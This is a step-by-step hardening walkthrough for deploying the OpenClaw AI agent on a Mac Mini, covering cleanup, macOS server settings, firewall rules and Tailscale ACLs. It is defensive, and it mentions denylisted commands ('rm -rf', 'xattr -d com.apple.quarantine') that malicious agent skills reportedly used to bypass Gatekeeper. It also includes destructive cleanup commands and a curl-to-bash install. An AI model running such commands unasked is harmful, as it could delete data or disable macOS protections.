# OpenClaw Deployment Walkthrough — v1.1

**Date:** 2026-02-11
**Operator:** Sean Currie
**Target:** Apple M4 Mac Mini, 16GB RAM, Tailscale configured
**OpenClaw Target Version:** >= 2026.1.29 (mandatory — CVE patches)
**Based On:** ClawdBot Research Project — 130+ sources across Context7 + Bright Data
**Updated:** 2026-02-14 — Added Phase 0 (Machine Preparation) for existing Mac Mini with v1 DevHub build

---

## How to Use This Walkthrough

This is a **read-ahead guide**, not a live session script. Here's how it works:

1. **Read ahead.** Go through the whole thing (or a phase at a time) before touching the Mac Mini. Understand what's coming and why.
2. **Deploy on your own.** Follow the steps on the Mac Mini. Every command is copy-pasteable, every expected output is documented.
3. **Check in when you need to.** Come back to the conversation when something doesn't match, you have a question, or you want to discuss a decision before executing it.
4. **Fill in Deployment Notes.** Every phase ends with a blank "Deployment Notes" section. Use it to record what actually happened — deviations, surprises, observations. This is how the research project stays alive.
5. **Report back when done.** After deployment (or when stuck), we'll update the project together: activity log, intelligence log, CONTEXT.md, and annotate this walkthrough with real-world findings.

**A note on the educational approach:** This isn't a beginner tutorial and it isn't a reference manual. It's structured like a knowledgeable colleague walking you through a new stack — explaining the *why* behind each step, not just the *what*. Some phases have "Understanding" sections that dig into key concepts. These exist because the command makes more sense when you understand what it's doing.

**Time estimate:** 2-3 hours for the full deployment (Phases A through I), assuming no blockers.

---

## State of Research at Time of Writing

This snapshot captures what the research project knew when this walkthrough was written. If you're reading this months later and OpenClaw has shipped major updates, check whether these findings still hold.

**Date:** 2026-02-11
**Research sources:** 130+ across Context7 (official docs) and Bright Data (community intelligence)
**Research project:** 34 files, 11,500+ lines across 7 knowledge base buckets, 5 synthesis reports, 52 intelligence log entries

### Three Verdicts

| Verdict | Decision | Evidence |
|---------|----------|----------|
| **Mac Mini M4** | GO | Community-validated, overpowered for single-agent deployment. 16GB is plenty. ARM-native Node.js available. |
| **OpenClaw** | GO with mandatory hardening | Two critical CVEs patched in v2026.1.29. Default config is dangerously permissive. 12% of ClawHub skills are malicious. Hardening is non-negotiable. |
| **Recommended Stack** | OpenClaw + n8n + Langfuse | OpenClaw for reasoning. n8n for deterministic workflows (future). Langfuse for observability (future). This walkthrough covers OpenClaw only. |

### Key Decisions Applied in This Walkthrough

These decisions emerged from the research and are baked into every configuration in this guide:

- **Zero ClawHub skills** — Custom Markdown skills only. The ClawHub ecosystem has a 12% malicious rate (341 of 2,857 skills per Koi Security audit). We write our own.
- **Elevated mode DISABLED** — Instead of a global escape hatch that bypasses sandbox, we use per-agent routing where each agent has its own permissions. (See Pattern 002)
- **Security hardening BEFORE channel connection** — Phase D comes before Phase F. Once Telegram is connected, the internet can reach the agent. Hardening after that is too late.
- **Dedicated non-admin macOS user** — The OpenClaw process runs under a user that cannot `sudo`. Limits blast radius.
- **Local GGUF embeddings** — Memory search stays on-device via the M4 Neural Engine. No data leaves the Mac Mini for embedding generation. (See Pattern 005 — configured in Week 1-2, not Day 1)
- **Model routing via per-agent assignment** — Failover-based (primary + fallback chain), not intelligent. Opus for everything Day 1, cost-optimize later.

### Open Questions to Resolve During This Deployment

These couldn't be answered by research alone. You'll test them hands-on:

| # | Question | When to Test | What to Watch For |
|---|----------|-------------|-------------------|
| 0 | Machine state audit | Phase 0 (prep) | Audit commands capture current state — review before proceeding |
| 1 | CVE patch verification | Phase C (install) | `openclaw --version` must show >= 2026.1.29 |
| 2 | macOS Keychain behavior | Phase C (onboard) | Screenshot every TCC/Keychain dialog. Deny by default. |
| 3 | Docker sandbox on Apple Silicon | Phase D (sandbox) | Memory consumption in Activity Monitor. Does 16GB hold? |
| 4 | launchd + dedicated user | Phase C (gateway) | Does LaunchAgent load for non-admin user? |
| 5 | exec-approvals pattern matching | Phase H (validation) | Does denying `rm -rf` also block `/bin/rm -rf`? |
| 6 | Backup encryption | Phase I (backups) | Is Time Machine actually encrypting? |
| 7 | Docker sandbox resource consumption | Phase G (first run) | RAM/CPU during active conversation with sandbox |
| 8 | Tailscale Serve + OpenClaw auth | Phase F (channel) | Can you access Gateway UI via Tailscale HTTPS? |

---

## Pre-Flight Checklist

Complete **all** of this before sitting down to deploy. Getting halfway through and realizing you don't have a Telegram bot token means breaking flow.

### Items to Acquire

| Item | How to Get It | Why You Need It |
|------|--------------|-----------------|
| **Anthropic API key** | [console.anthropic.com](https://console.anthropic.com/) > API Keys > Create Key | This is how OpenClaw talks to Claude. Every message the agent processes costs API tokens. The key authenticates your account. |
| **Telegram bot token** | Open Telegram > message @BotFather > `/newbot` > follow prompts > copy token | Telegram bots are how you'll message the agent. BotFather is Telegram's official tool for creating bots. The token is the bot's password. |
| **Telegram user ID** | Message @userinfobot on Telegram > it replies with your numeric ID | The `allowFrom` setting in the config restricts who can talk to your bot. Your numeric ID (not your username) is how OpenClaw identifies you. |
| **Brave Search API key** | [brave.com/search/api](https://brave.com/search/api/) > sign up (free tier available) | Gives the agent web search capability. Brave's API is privacy-focused and has a generous free tier. |
| **Mac Mini admin password** | You should already know this | Needed for `sudo` commands during macOS hardening, FileVault, and user creation. |
| **2-3 hours of uninterrupted time** | Block your calendar | Full deployment through first conversation test. Rushing security hardening is how things get missed. |

### Recommended (Not Required)

| Item | Cost | Why |
|------|------|-----|
| **UPS (battery backup)** | ~$30-50 | Mac Mini restarts on power restore, but a UPS prevents dirty shutdowns during power flickers. Community consensus says this is worth it for an always-on machine. |
| **Dummy HDMI plug** | ~$5-10 | macOS runs in degraded graphics mode without a display connected. If you ever need screen capture or remote desktop, this prevents low-resolution rendering. A $5 fix for a known gotcha. |

### Verify Connectivity

Before starting, confirm you can reach the deployment Mac Mini from your primary machine:

```bash
# From your primary Mac (via Tailscale SSH)
ssh openclaw-mac-mini "hostname && sw_vers && uname -m"
# Expected: [hostname], macOS 15.x (or later), arm64
```

If this doesn't work, fix Tailscale connectivity first. The rest of this walkthrough assumes you can SSH into the Mac Mini.

---

## Phase 0: Machine Preparation

**What we're doing:** Preparing your existing Mac Mini — which has a v1 DevHub build (Homebrew, Docker, Ollama, Tailscale, FastAPI projects, monitoring containers) — for its new role as a dedicated OpenClaw deployment node. No wipe needed.
**Why it matters:** This isn't tidying. Identity artifacts (iCloud, Google) create data exfiltration paths that conflict with OpenClaw's local-first security model. Unnecessary services (Ollama, monitoring containers) expand the attack surface. Existing software (Homebrew, Docker) changes the deployment path for later phases.
**Time estimate:** 30-45 minutes.
**Source context:** This phase was added on 2026-02-14 based on a review of the Mac Mini's actual state (v1 DevHub build from a prior project) against this project's security research.

### Understanding: Redefining the Machine's Role

Your Mac Mini started life as a modular dev node — a lab bench for Docker, local LLMs, FastAPI, and CI/CD experiments. That was the right build for exploration. But the role is changing. This machine is about to become a security-hardened, headless AI agent orchestration node running OpenClaw as a persistent service, accessible exclusively via Tailscale, with Docker sandbox for tool isolation.

That role change has two implications:

First, **identity artifacts become a security liability.** iCloud sync means files under `~/.openclaw/` (API keys, session transcripts, credentials) could sync to Apple's servers — defeating the data residency controls we designed. Logged-in browsers with saved Google sessions are the exact attack bridge that CVE-2026-25253 (CVSS 8.8, 1-click RCE) exploits. On a personal device, staying logged into iCloud and Google is normal. On an agent node, it's an attack surface.

Second, **leftover services are unnecessary exposure.** Ollama listening on a port, Glances/Dozzle containers running, old project files scattered across the filesystem — none of these are part of the OpenClaw stack, but all of them are surface area the agent could theoretically interact with. The principle is simple: if OpenClaw doesn't need it, it shouldn't be there.

The good news: most of your v1 build helps rather than hurts. Homebrew, Docker Desktop, Tailscale, Git, and your terminal setup are all things we'd install from scratch on a clean machine. You're ahead — you just need to clean and verify rather than build from zero.

### 0.1: Identity & Sync Disconnection

**Concept:** This is a security requirement, not personal preference. OpenClaw stores credentials, session transcripts, and API keys locally. Cloud sync services create paths for that data to leave the machine. A logged-in browser is the attack vector for the most critical CVE in OpenClaw's history.

**Actions (in System Settings and browsers — these are GUI steps):**

1. **iCloud:** System Settings > [Your Name] > Sign Out. If you want to keep your Apple ID for App Store access only, instead go to System Settings > [Your Name] > iCloud and individually disable: iCloud Drive, Photos, Contacts, Calendars, Keychain, Safari, Notes, and everything else. The goal is zero sync.

2. **Google accounts:** Open every browser on this machine (Safari, Chrome, Firefox, etc.). Sign out of all Google accounts. Clear saved sessions and cookies. If you use Chrome, also go to Settings > You and Google > Turn off sync.

3. **Other cloud sync:** If Dropbox, OneDrive, or any other sync service is installed, sign out and quit it. Check System Settings > General > Login Items to see what starts at boot — remove anything sync-related.

**Verification:**
```bash
# Check for running sync processes
ps aux | grep -i -E "icloud|dropbox|onedrive|googledrive" | grep -v grep
# Expected: No results (nothing sync-related running)

# Check Login Items for sync services
osascript -e 'tell application "System Events" to get the name of every login item'
# Review the list — flag anything that syncs to cloud
```

**Expected output:** No cloud sync processes running. Login Items clean of sync services.

**If something's wrong:**
- If iCloud sign-out asks about keeping data locally: choose "Keep on This Mac" — we're not deleting your data, just stopping sync
- If a sync process won't quit: check Activity Monitor, force quit if needed
- If you need your Apple ID for App Store (e.g., to update apps): keep it signed in but disable ALL iCloud services individually

### 0.2: Software Audit

**Concept:** Before removing anything, capture the machine's current state. This serves two purposes: it gives you a record of what was installed (in case you need to reconstruct something later), and it gives you (or your agent) data to review rather than relying on memory.

```bash
# Capture pre-cleanup state — save this output
echo "=== HOMEBREW PACKAGES ===" && brew list && echo "" && \
echo "=== HOMEBREW CASKS ===" && brew list --cask && echo "" && \
echo "=== DOCKER CONTAINERS ===" && docker ps -a 2>/dev/null && echo "" && \
echo "=== DOCKER IMAGES ===" && docker images 2>/dev/null && echo "" && \
echo "=== GLOBAL NPM PACKAGES ===" && npm list -g --depth=0 2>/dev/null && echo "" && \
echo "=== PIP PACKAGES ===" && pip list 2>/dev/null && echo "" && \
echo "=== LISTENING PORTS ===" && lsof -iTCP -sTCP:LISTEN -P 2>/dev/null && echo "" && \
echo "=== HOME DIRECTORY ===" && ls -la ~/
```

**Expected output:** A snapshot of everything on the machine. Save this output — paste it into the Deployment Notes section at the end of this phase, or save it to a file:
```bash
# Optional: save to a file for the record
bash -c 'echo "=== HOMEBREW PACKAGES ===" && brew list && echo "" && echo "=== HOMEBREW CASKS ===" && brew list --cask && echo "" && echo "=== DOCKER CONTAINERS ===" && docker ps -a 2>/dev/null && echo "" && echo "=== DOCKER IMAGES ===" && docker images 2>/dev/null && echo "" && echo "=== GLOBAL NPM PACKAGES ===" && npm list -g --depth=0 2>/dev/null && echo "" && echo "=== PIP PACKAGES ===" && pip list 2>/dev/null && echo "" && echo "=== LISTENING PORTS ===" && lsof -iTCP -sTCP:LISTEN -P 2>/dev/null && echo "" && echo "=== HOME DIRECTORY ===" && ls -la ~/' > ~/pre-openclaw-audit-$(date +%Y%m%d).txt
```

**This is a checkpoint.** Review the output. If you want a second opinion on what should stay or go, share it with your agent before proceeding to Step 0.3.

### 0.3: Software Cleanup

**Concept:** Remove services and software that aren't part of the OpenClaw stack. The keep/remove decisions below are based on this project's research — what OpenClaw needs vs. what was part of the v1 DevHub build.

**Ollama — remove (reinstall later if needed):**
```bash
# Stop Ollama if running
ollama stop 2>/dev/null
pkill -f ollama 2>/dev/null

# Remove Ollama
brew uninstall ollama 2>/dev/null
# Or if installed via the official installer:
sudo rm -rf /usr/local/bin/ollama
rm -rf ~/.ollama

# Verify
which ollama
# Expected: "ollama not found"
```
Ollama is a Week 1-2 roadmap item (local GGUF embeddings). Reinstall then if needed — no reason to keep it consuming disk space now.

**Docker containers — stop and remove all:**
```bash
# Stop all running containers
docker stop $(docker ps -q) 2>/dev/null

# Remove all containers (Glances, Dozzle, Portainer, etc.)
docker rm $(docker ps -aq) 2>/dev/null

# Remove all images
docker system prune -a --force

# Verify
docker ps -a
# Expected: empty list
docker images
# Expected: empty list
```
Docker Desktop itself stays — OpenClaw uses it for sandbox containers. We're just cleaning out the v1 monitoring stack.

**Old project repos and Python environments:**
```bash
# Review what's in your home directory
ls ~/

# Archive any repos you want to keep — push to GitHub if not already:
# cd ~/your-project && git push origin main

# Remove local copies of projects that are safely on GitHub:
# rm -rf ~/fastapi-project  (adjust names to match your actual directories)
# rm -rf ~/your-other-project

# Remove Python virtual environments:
# rm -rf ~/venv
# rm -rf ~/.local/lib/python*  (if pip installed packages globally)
```
**Note:** Only remove repos you've confirmed are pushed to GitHub. If in doubt, push first.

**PostgreSQL — stop if running:**
```bash
# Check if PostgreSQL is running
brew services list | grep postgresql
# If running:
brew services stop postgresql
# Optional — remove entirely if not needed:
# brew uninstall postgresql
```

**Unused Homebrew packages:**
```bash
# Update Homebrew and upgrade existing packages first
brew update && brew upgrade

# Review what's installed
brew list

# Remove packages you don't need (examples — adjust to your actual install):
# brew uninstall python@3.11  (if you don't need Python for OpenClaw)
# brew uninstall <other-unused-packages>

# Clean up orphaned dependencies and old downloads
brew autoremove && brew cleanup
```

**What to keep (do NOT remove):**
- `git` — needed for config-as-code backup
- `curl`, `wget` — HTTP tools
- `jq` — JSON processing (useful for config inspection)
- `htop` — system monitoring
- Docker Desktop — needed for OpenClaw sandbox
- Tailscale — core security infrastructure
- iTerm2 — terminal
- Node.js (any version) — will be upgraded/installed as Node 22 in Phase B

**Expected output:** A much leaner machine. Only software that serves the OpenClaw deployment remains.

### 0.4: Homebrew Health Check

**Concept:** Your existing Homebrew may have stale packages, broken links, or orphaned dependencies from the v1 build. Clean it up so Phase B starts from a healthy base.

```bash
# Run Homebrew's built-in diagnostics
brew doctor

# Fix any issues it reports (follow the suggestions in the output)

# Verify Homebrew is healthy
brew --version
```

**Expected output:** `brew doctor` reports "Your system is ready to brew" (or only cosmetic warnings).

**If something's wrong:**
- `brew doctor` may suggest unlinking or relinking packages — follow its advice
- If it warns about permissions: `sudo chown -R $(whoami) /opt/homebrew`

### 0.5: Docker Desktop Verification

**Concept:** Docker Desktop stays but should be clean and current. It will be used for OpenClaw's sandbox containers.

```bash
# Verify Docker Desktop is running
docker --version
docker info | head -20

# Check that no containers or images remain from cleanup
docker ps -a
docker images

# Update Docker Desktop if needed
# Open Docker Desktop > Check for Updates (this is a GUI step)
```

**Expected output:** Docker running, no containers, no images, current version.

### 0.6: Readiness Verification

**Concept:** This is the go/no-go gate before Phase A. Run this command block and review the output. Everything should look clean. If something unexpected appears — an unknown listening port, a sync process still running, more disk usage than expected — investigate before proceeding.

```bash
echo "=== READINESS CHECK ==="
echo ""
echo "--- macOS Version ---"
sw_vers
uname -m
echo ""
echo "--- FileVault ---"
sudo fdesetup status
echo ""
echo "--- SIP ---"
csrutil status
echo ""
echo "--- Gatekeeper ---"
spctl --status
echo ""
echo "--- Tailscale ---"
tailscale status
echo ""
echo "--- Homebrew Packages ---"
brew list
echo ""
echo "--- Homebrew Casks ---"
brew list --cask
echo ""
echo "--- Docker Status ---"
docker ps -a 2>/dev/null
docker images 2>/dev/null
echo ""
echo "--- Listening Ports ---"
lsof -iTCP -sTCP:LISTEN -P 2>/dev/null
echo ""
echo "--- Disk Space ---"
df -h /
echo ""
echo "--- Memory ---"
sysctl hw.memsize | awk '{print $2/1073741824 " GB"}'
echo ""
echo "--- Cloud Sync Processes ---"
ps aux | grep -i -E "icloud|dropbox|onedrive|googledrive" | grep -v grep
echo ""
echo "=== END READINESS CHECK ==="
```

**What you're looking for:**
- macOS 15.x, arm64
- FileVault: On (or "Encryption in progress...")
- SIP: enabled
- Gatekeeper: assessments enabled
- Tailscale: connected with your devices listed
- Homebrew: lean list — git, core tools, maybe Docker cask
- Docker: no containers, no images
- Listening ports: nothing unexpected (no Ollama on 11434, no Postgres on 5432, no Glances/Dozzle)
- Disk: reasonable free space (50+ GB preferred)
- Memory: 16 GB
- Cloud sync: no results (nothing running)

**If everything looks clean:** Proceed to Phase A.
**If something unexpected appears:** Investigate before continuing. This is the last checkpoint before you start hardening the OS.

### Phase 0 — Deployment Notes

*Fill this in during deployment:*

- [ ] iCloud signed out / all sync disabled?
- [ ] Google accounts signed out of browsers?
- [ ] Pre-cleanup audit saved?
- [ ] Ollama removed?
- [ ] Docker containers/images cleaned?
- [ ] Old project repos archived and removed?
- [ ] Homebrew cleaned and healthy?
- [ ] Readiness check reviewed — all clean?
- Notes / deviations / surprises:

---

## Phase A: macOS Hardening

**What we're doing:** Turning your Mac Mini from a desktop computer into a secure, always-on server.
**Why it matters:** Everything you install after this sits on the foundation you build here. A poorly hardened OS undermines every security layer above it.
**Time estimate:** 20-30 minutes.
**Deeper context:** `knowledge-base/03-security/security-posture-analysis.md`

### Understanding: macOS as a Server

macOS was designed for someone sitting at a desk. It sleeps after inactivity, pops up update dialogs, runs screensavers, and assumes there's a human watching. None of that works for a 24/7 AI agent that needs to respond to Telegram messages at 3am.

Tim's VPS ran Debian Linux — an OS built for servers. It doesn't sleep, doesn't auto-update, doesn't assume a display. When Tim hardened his VPS (non-root user, UFW firewall, SSH keys), he was following well-documented server administration patterns. On macOS, you're doing the equivalent work, but every step is different: `launchd` instead of `systemd`, `pf` instead of `ufw`, `dscl` instead of `useradd`, and a handful of macOS-specific gotchas that Tim never covered because they don't exist on Linux.

The other thing that's different is the security model. On Linux, the root/non-root separation is sharp and well-understood. On macOS, there are "admin" users and "standard" users, plus a hidden root account, plus System Integrity Protection (SIP) preventing even root from modifying system files, plus Gatekeeper checking app signatures. We're going to use all of these layers. The dedicated non-admin user means the OpenClaw process can't `sudo` — so even if an attacker gets code execution through the agent, they can't escalate to system-level access.

One advantage you have: your Mac Mini isn't starting from zero. The Phase 0 prep you just completed means Homebrew is already installed and healthy, Tailscale is already configured and running, and Docker Desktop is clean and ready for sandbox use. The server hardening steps in this phase still apply in full — sleep prevention, FileVault, firewall rules, SIP verification — but you won't be installing foundational tools alongside them.

### A1: Create a Dedicated Non-Admin User

**Concept:** OpenClaw will run under its own user account that has no admin privileges. Think of it as a fence — the agent can do things within its own space, but it can't install software, modify system settings, or access other users' files. The official docs recommend this even on dedicated machines.

```bash
# Create the openclaw user account (run from your admin account)
sudo dscl . -create /Users/openclaw
sudo dscl . -create /Users/openclaw UserShell /bin/bash
sudo dscl . -create /Users/openclaw RealName "OpenClaw Service"
sudo dscl . -create /Users/openclaw UniqueID 550
sudo dscl . -create /Users/openclaw PrimaryGroupID 20
sudo dscl . -create /Users/openclaw NFSHomeDirectory /Users/openclaw
sudo createhomedir -c -u openclaw

# Set a strong password (you will be prompted)
sudo dscl . -passwd /Users/openclaw

# CRITICAL: Verify it is NOT an admin
dscl . -read /Groups/admin GroupMembership
# Expected: The "openclaw" username should NOT appear in this list
```

**Expected output:** A `/Users/openclaw` home directory exists. The user can log in but cannot use `sudo`.

**If something's wrong:**
- If `UniqueID 550` conflicts: pick another number (501-599 range, check existing IDs with `dscl . -list /Users UniqueID`)
- If the user shows up in the login screen and you don't want that: `sudo defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array-add openclaw`

**Heads up (Open Question #4):** The macOS companion app might require the logged-in GUI user's context for TCC permissions. If the gateway won't run properly under this user in Phase C, the fallback is running under your admin account with strict file permissions. Note what happens in your deployment notes.

### A2: Always-On Settings

**Concept:** macOS will sleep, turn off the display, and spin down the disk by default. All of these break a 24/7 agent. We're disabling every power-saving mode and adding a belt-and-suspenders approach with `caffeinate` — a macOS utility that asserts "keep this machine awake" at the system level.

Community reports confirm sleep/wake issues are the #1 headless Mac Mini gotcha (GitHub Discussion #7700).

**Check current state first** (some of these may already be configured from previous use):

```bash
pmset -g
```

Review the output. If sleep settings are already at 0, you can skip those specific commands and just verify.

```bash
# Disable all sleep modes
sudo pmset -a sleep 0
sudo pmset -a displaysleep 0
sudo pmset -a disksleep 0

# Auto-restart after power failure
sudo pmset -a autorestart 1

# Disable wake-on-LAN (only Tailscale should wake this machine)
sudo pmset -a womp 0

# Prevent automatic power off
sudo pmset -a autopoweroff 0

# Disable Power Nap
sudo pmset -a powernap 0

# Verify all settings
pmset -g
# Expected output should show:
#   sleep          0
#   displaysleep   0
#   disksleep      0
#   autorestart    1
#   womp           0
#   autopoweroff   0
#   powernap       0
```

**Belt and suspenders — caffeinate daemon:**

`caffeinate` is a macOS utility that prevents sleep. We're creating a `launchd` daemon (a system-level service that starts at boot) to run it permanently:

```bash
sudo tee /Library/LaunchDaemons/com.local.caffeinate.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.local.caffeinate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/caffeinate</string>
        <string>-dimsu</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

sudo launchctl load /Library/LaunchDaemons/com.local.caffeinate.plist
```

**What `-dimsu` means:** prevent display sleep (`d`), prevent idle sleep (`i`), prevent disk sleep (`m`), prevent system sleep (`s`), and declare user activity (`u`). It's every sleep prevention flag at once.

**Expected output:** No visible change — the machine simply won't sleep anymore.

**If something's wrong:**
- If `launchctl load` fails with "service already loaded": run `sudo launchctl unload /Library/LaunchDaemons/com.local.caffeinate.plist` first, then reload
- To verify caffeinate is running: `ps aux | grep caffeinate` — you should see the process

### A3: Headless Operation

**Concept:** Without a physical display connected, macOS drops into a degraded graphics mode. This affects screen captures and remote desktop quality. The fix is a $5 dummy HDMI plug that tricks macOS into thinking a monitor is connected.

**Option 1 — Dummy HDMI plug (recommended):**
Plug it into the Mac Mini's HDMI port. That's it. macOS detects a "display" and maintains full graphics mode.

**Option 2 — Software virtual display:**
macOS 14+ supports virtual displays via the `CGVirtualDisplay` API. Third-party tools like "MacMate" use this. But a $5 dummy plug is simpler and more reliable.

**Disable screensaver and auto-lock:**

```bash
# Disable screensaver
defaults -currentHost write com.apple.screensaver idleTime 0

# Disable auto-lock
# Note: This must be done in System Settings GUI:
# System Settings > Lock Screen > Require password after screen saver begins > Never (or maximum interval)
# System Settings > Lock Screen > Start Screen Saver when inactive > Never
```

**Expected output:** No screensaver will activate. No lock screen will appear.

### A4: Disable Automatic Updates

**Concept:** Automatic macOS updates force restarts. On a server running a 24/7 agent, an unexpected restart at 2am kills the gateway, drops active conversations, and means the agent is unreachable until the machine finishes updating and reboots. On a server, updates must be manual and deliberate.

**Important trade-off:** Disabling auto-updates means YOU are responsible for checking for security updates. We'll add this to the weekly monitoring cadence in Phase I.

**Check current state first:**

```bash
defaults read /Library/Preferences/com.apple.SoftwareUpdate 2>/dev/null
```

If auto-updates are already disabled, verify and move on.

```bash
# Disable automatic macOS updates
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticCheckEnabled -bool false
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticDownload -bool false
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticallyInstallMacOSUpdates -bool false
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate CriticalUpdateInstall -bool false

# Disable automatic App Store updates
defaults write com.apple.commerce AutoUpdate -bool false

# Verify
defaults read /Library/Preferences/com.apple.SoftwareUpdate
# All four values should show 0 (false)
```

**Expected output:** All auto-update settings show as disabled.

**If something's wrong:**
- If `defaults read` shows values you didn't set: check if MDM (Mobile Device Management) is controlling update policy. Run `profiles list` to see if there are configuration profiles installed.

### A5: Enable FileVault

**Concept:** FileVault is macOS's full-disk encryption. Without it, anyone who physically takes the Mac Mini can pull the drive and read everything — API keys, chat transcripts, session history, credentials. All of this sits unencrypted under `~/.openclaw/` unless the disk itself is encrypted.

**If you enabled FileVault during Phase 0:** Just verify it completed:

```bash
sudo fdesetup status
# Expected: "FileVault is On."
```

If it's still encrypting, that's fine — continue with the walkthrough. Encryption runs in the background.

```bash
# Check current FileVault status
sudo fdesetup status
# If "FileVault is Off.":

# Enable FileVault
sudo fdesetup enable
# You will be prompted to choose a recovery method:
# - Choose "Create a recovery key and do not use my iCloud account"
# - WRITE DOWN THE RECOVERY KEY AND STORE IT SOMEWHERE SEPARATE FROM THE MAC MINI
# - The encryption process runs in the background and may take hours for a full disk

# Verify encryption is in progress
sudo fdesetup status
# Expected: "FileVault is On." or "Encryption in progress..."
```

**Expected output:** FileVault is on or encrypting.

**If something's wrong:**
- If FileVault is already on: great, move on
- If enabling fails: check that you have an admin account and sufficient disk space
- The encryption runs in the background — you can continue with the rest of the walkthrough while it encrypts

**Store the recovery key securely.** If you lose it AND forget the account password, the data on this Mac Mini is gone forever. That's the point of encryption — but it means the recovery key matters.

### A6: macOS Firewall (pf)

**Concept:** Tim configured firewall rules on his VPS using UFW (Uncomplicated Firewall). macOS uses `pf` (packet filter) — a completely different system. But here's the thing: with our gateway bound to loopback (localhost only), the port isn't even exposed to the network. So these firewall rules are defense in depth — a second lock on a door that's already closed. If something goes wrong with the loopback bind, the firewall is the backup.

**Step 1: Enable the macOS built-in firewall**

Do this in the GUI:
- System Settings > Network > Firewall > Turn ON
- Click "Options":
  - Enable stealth mode: ON (the Mac Mini won't respond to ping or port scans)
  - Block all incoming connections: Consider this for initial hardening (you can relax it later)

**Step 2: Create pf rules for OpenClaw**

```bash
sudo tee /etc/pf.anchors/openclaw.rules << 'EOF'
# OpenClaw pf rules
# Block any external access to gateway port (belt-and-suspenders with loopback bind)
block in on en0 proto tcp from any to any port 18789
# Allow on Tailscale interfaces (utun devices)
pass in on utun0 proto tcp from any to any port 18789
pass in on utun1 proto tcp from any to any port 18789
pass in on utun2 proto tcp from any to any port 18789
EOF
```

**What this does:** Even if the gateway somehow binds to all interfaces instead of just loopback, the firewall blocks port 18789 on the physical network (`en0`) while allowing it through Tailscale's tunnel interfaces (`utun*`).

**Step 3: Add the rules to pf.conf**

```bash
# Backup the current config
sudo cp /etc/pf.conf /etc/pf.conf.backup.$(date +%Y%m%d)

# Check if our anchor already exists
grep -q "openclaw" /etc/pf.conf
# If it does NOT exist (grep returns nothing), add it:
echo 'anchor "openclaw"' | sudo tee -a /etc/pf.conf
echo 'load anchor "openclaw" from "/etc/pf.anchors/openclaw.rules"' | sudo tee -a /etc/pf.conf

# Load and enable
sudo pfctl -f /etc/pf.conf
sudo pfctl -e  # Enable pf if not already enabled
sudo pfctl -sr  # Show loaded rules — verify openclaw rules appear
```

**Expected output:** `pfctl -sr` shows the openclaw rules loaded.

**If something's wrong:**
- If `pfctl -f` shows syntax errors: check `/etc/pf.conf` for formatting issues. Restore from backup if needed: `sudo cp /etc/pf.conf.backup.* /etc/pf.conf`
- If pf is already enabled: that's fine, the `-e` flag is idempotent

### A7: Tailscale ACL Verification

**Concept:** Tailscale is already installed and running on your Mac Mini from the v1 build — and it's the strongest security layer in this deployment — stronger than the firewall, stronger than the loopback bind. It creates an encrypted tunnel between your devices, and only devices on your Tailscale network can reach each other. Our research concluded Tailscale is "ACTUALLY BETTER THAN TIM DESCRIBED" because it replaces several of Tim's manual hardening steps (SSH keys, port-based firewall rules) with a single identity-based access control system.

```bash
# Verify Tailscale is running and connected
tailscale status
# Expected: Shows connected devices including this Mac Mini

# Verify Tailscale starts on boot
# System Settings > General > Login Items > check that Tailscale is listed

# Verify SSH works via Tailscale
tailscale ssh status
```

**Tailscale ACL configuration** (done in the admin console at [login.tailscale.com/admin/acls](https://login.tailscale.com/admin/acls)):

```json
{
  "acls": [
    {
      "action": "accept",
      "src": ["sean-laptop", "sean-phone"],
      "dst": ["mac-mini-openclaw:18789"],
      "proto": "tcp"
    },
    {
      "action": "accept",
      "src": ["sean-laptop"],
      "dst": ["mac-mini-openclaw:22"],
      "proto": "tcp"
    }
  ],
  "ssh": [
    {
      "action": "accept",
      "src": ["autogroup:members"],
      "dst": ["mac-mini-openclaw"],
      "users": ["openclaw"]
    }
  ]
}
```

**What this restricts:**
- Gateway access (port 18789): only your laptop and phone via Tailscale
- SSH access: only your laptop
- SSH login: only to the `openclaw` user

**Adapt the device names** (`sean-laptop`, `sean-phone`, `mac-mini-openclaw`) to match your actual Tailscale device names. You can find them in the admin console.

**Expected output:** Tailscale status shows devices connected. ACLs are applied.

### A8: Verify SIP and Gatekeeper

**Concept:** System Integrity Protection (SIP) and Gatekeeper are macOS's built-in defenses against system tampering and unsigned software. SIP prevents even root from modifying system files. Gatekeeper prevents unsigned apps from running. Both MUST stay enabled.

Why this matters for OpenClaw specifically: our research found that malicious skills have been observed using `xattr -d com.apple.quarantine` to bypass Gatekeeper — which is why that command is in our exec-approvals denylist in Phase D.

```bash
# Verify SIP is enabled
csrutil status
# Expected: "System Integrity Protection status: enabled."

# Verify Gatekeeper is enabled
spctl --status
# Expected: "assessments enabled"
```

**If either is disabled: STOP.** Do not proceed with deployment until re-enabled. SIP requires booting into Recovery Mode to toggle. Gatekeeper: `sudo spctl --master-enable`.

**Expected output:** Both enabled.

### Phase A — Deployment Notes

*Fill this in during deployment:*

- [ ] Dedicated user created? Username: ___
- [ ] Always-on settings applied? Any issues?
- [ ] Headless setup (dummy HDMI or software)?
- [ ] Auto-updates disabled?
- [ ] FileVault enabled/encrypting?
- [ ] Firewall configured?
- [ ] Tailscale ACLs set?
- [ ] SIP and Gatekeeper verified?
- Notes / deviations / surprises:

---

## Phase B: Runtime Setup

**What we're doing:** Installing Node.js — the only runtime dependency OpenClaw needs.
**Why it matters:** OpenClaw is a Node.js application. Wrong version or wrong architecture means it won't run (or will run slowly under emulation).
**Time estimate:** 5 minutes.

### B1: Install Node.js 22+ via Homebrew

**Concept:** OpenClaw requires Node.js 22 or higher. Homebrew (macOS's package manager) provides ARM-native builds for Apple Silicon, meaning Node.js runs directly on the M4's performance cores — no Rosetta 2 translation layer. This matters for a long-running service because emulation adds CPU overhead and can introduce subtle issues.

```bash
# If Homebrew is not installed on the Mac Mini:
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

